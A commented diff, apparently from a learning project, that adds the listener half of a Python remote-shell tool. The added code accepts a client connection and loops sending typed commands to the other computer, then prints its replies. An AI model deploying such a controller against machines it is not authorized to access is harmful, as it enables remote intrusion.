@@ -47,3 +47,49 @@ def bind_socket():
 
         # recursive function call (will try and bind again)
         bind_socket()
+
+
+#  Function to establish connection with a client (assuming the socket is listening already)
+def accept_socket():
+
+    # s.accpet() outputs an object of the connection or conversation
+    # as well as a second output which is a list containing IP address and a port
+    # so we initialized two new variables to hold each of these outputs
+    conn, address = s.accept()
+
+    # print out first element of the list (ip address) and the second element which is the port number of the client
+    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
+
+    # once connection has been established we can send commands over this connection to the client (other computer)
+    # done through another custom function called send_commands (defined below)
+    send_commands(conn)
+    conn.close() # after socket has been established, we need to close the connection
+
+# Function to send commands to client computer
+def send_commands(conn):
+
+    # conduct infinite while loop allowing us to send multiple commands before connection gets closed
+    while True:
+        # takes input from command prompt
+        cmd = input()
+
+        # if command is to quit
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            # remembering to close the command prompt as well
+            sys.exit()
+
+        # anything travelling over the connection between 2 computers is sent in bytes
+        # to actually k,now if the user typed something into the command prompt we need to encode to bytes
+        # and check if the length of that byte string is > 0. if it is, this means a command has been entered into cmd
+        if len(str.encode(cmd)) > 0:
+            # to send messages got to be converted from string to bytes
+            conn.send(str.encode(cmd))
+            # to receive messages got to be converted from bytes to string
+            # in this case using the encoding format of utf-8 and in chunks of 1024 bits
+            client_response = str(conn.recv(1024),"utf-8")
+
+            # end="" basically allows the command prompt to go to the next line after generating output (as it would)
+            print(client_response, end="")
+            
